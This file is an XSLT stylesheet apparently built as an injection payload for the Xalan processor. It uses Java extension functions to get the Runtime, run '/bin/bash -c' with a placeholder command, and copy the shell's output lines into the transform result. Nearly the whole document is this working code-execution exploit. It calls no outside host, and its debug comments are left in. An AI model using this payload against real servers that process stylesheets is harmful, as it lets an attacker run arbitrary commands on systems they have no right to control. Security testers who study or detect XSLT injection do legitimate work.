<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:j="http://xml.apache.org/xalan/java" xmlns:bufferedreader="xalan://java.io.BufferedReader" xmlns:inputstreamreader="xalan://java.io.InputStreamReader" xmlns:process="xalan://java.lang.Process" xmlns:runtime="xalan://java.lang.Runtime" xmlns:loop="http://informatik.hu-berlin.de/loop" exclude-result-prefixes="j" version="1.0">

  <!-- Configure the output -->
  <xsl:output method="xml" omit-xml-declaration="yes"/>
  <xsl:strip-space elements="*"/>

    <!-- Some variables -->
  <xsl:variable name="rt" select="runtime:getRuntime()"/>
  <xsl:variable name="os" select="j:java.lang.System.getProperty('os.name')"/>
  <xsl:variable name="unix_shell" select="'/bin/bash'"/>
  <xsl:variable name="unix_option" select="'-c'"/>
  <xsl:variable name="delim" select="' -=DELIM=- '"/>

    <!-- The main template -->
  <xsl:template match="/"> 
    <!-- Fetch from the XML file -->
    <xsl:variable name="command">
      kunseok
    </xsl:variable>


    <!-- Check the underlying OS -->
    <xsl:variable name="tmp">
      <xsl:value-of select="concat($unix_shell, $delim, $unix_option, $delim, $command)"/>
    </xsl:variable>
    <xsl:variable name="cmd" select="j:java.lang.String.new($tmp)"/>     

      <!-- Create the process and its streams -->
    <xsl:variable name="array" select="j:split($cmd, $delim)"/>
    <xsl:variable name="proc" select="runtime:exec($rt, $array)"/>
    <xsl:variable name="inputstream" select="process:getInputStream($proc)"/>
    <xsl:variable name="inputstreamreader" select="inputstreamreader:new($inputstream)"/>
    <xsl:variable name="bufferedreader" select="bufferedreader:new($inputstreamreader)"/>

      <!-- Prepare the loop -->
    <xsl:variable name="cond" select="1"/>
    <xsl:variable name="result" select="N/A"/>
    <loop:while test="$cond">

      <!-- Read a line -->
      <loop:do>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
        out: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/>
          <!-- Debug code
            <xsl:variable name="continue" select="$line"/>
            <xsl:variable name="class" select="j:toString(j:getClass($line))"/>
            <xsl:variable name="continue" select="j:equals($class, 'class java.lang.String')"/>
            <xsl:text>Line: </xsl:text><xsl:value-of select="$line"/> <xsl:text>&#xA;</xsl:text>
            <xsl:text>Loop : </xsl:text><xsl:value-of select="$continue"/> <xsl:text>&#xA;</xsl:text>
          -->
          </loop:do>

          <!-- Print the result -->
          <loop:last>
            <!-- Debug code
              <xsl:text>Result:</xsl:text>
              <xsl:text>&#xA;</xsl:text>
              <xsl:value-of select="$result"/>
            -->

            </loop:last>

            <!-- Update the global variables -->
            <loop:update name="cond" select="$continue"/>

          </loop:while>
        </xsl:template>
      </xsl:stylesheet>
